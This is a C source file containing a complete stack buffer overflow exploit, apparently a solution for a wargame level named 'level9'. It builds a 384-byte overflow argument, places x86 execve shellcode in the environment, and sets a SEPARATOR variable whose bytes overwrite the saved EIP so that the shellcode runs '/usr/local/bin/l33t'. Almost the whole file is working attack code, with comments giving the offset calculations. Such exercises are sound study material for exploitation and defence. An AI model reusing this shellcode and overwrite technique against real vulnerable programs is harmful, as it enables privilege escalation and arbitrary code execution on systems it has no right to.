#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#define VULN "../../var/challenge/level9/9"

/* Input buffer is 412 bytes away from the saved EIP */
/* To overwrite the saved EIP with the address of the shellcode, allocate 384 bytes to the third argument,
   and 32 bytes to the separator variable with the last four bytes being the address of shellcode to rewrite saved EIP with 
*/

/* The shellcode for executing the '/usr/local/bin/l33t' command */
char shellcode[] = "\xeb\x15\x5b\x31\xc0\x88\x43\x13\x89\x5b\x14\x89\x43\x18\x8d\x4b\x14\x89\xc2\xb0\x0b\xcd\x80\xe8\xe6\xff\xff\xff/usr/local/bin/l33t";
/* Initialize the input of the separator environment variable (address of shellcode and 1's)*/
char separator [] = "SEPARATOR=\xab\xff\xff\xbf\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\x31\xab\xff\xff\xbf";

/* Construct a method that will build a string of a specified character and length */
char* buildString(char character, int length) {
    
    /* Allocate memory for the string (including the null terminator) */
    char* result = (char*)malloc((length + 1) * sizeof(char));

    if (result == NULL) {
        fprintf(stderr, "Memory allocation failed\n");
        exit(EXIT_FAILURE);
    }

    /* Fill the string with the specified character */
    for (int i = 0; i < length; i++) {
        result[i] = character;
    }

    /* Add the null terminator at the end */
    result[length] = '\0';
    return result;
}

int main() {
    /* Insert 384 bytes as the third argument to fill up its buffer */
	char *cmdParam3 = buildString('1', 384);	

	/* Define a null-terminated ARGV array for execve() */
	char *progWithParameters[] = {VULN, "2", "30", cmdParam3, NULL};
	
	/* Define a null-terminated ENVP (environment) array for execve() */
	/* This is where the shellcode is placed on the environment */
	char *envp[] = {separator, shellcode, NULL};
	
	/* Invoke execve(prog, progWithParameters, envp) */
	if (execve(VULN, progWithParameters, envp) == -1) {
		perror("execve");
        	exit(EXIT_FAILURE);
	}

	/* The code after execve will not be reached if execve is successful */
	return 0;
}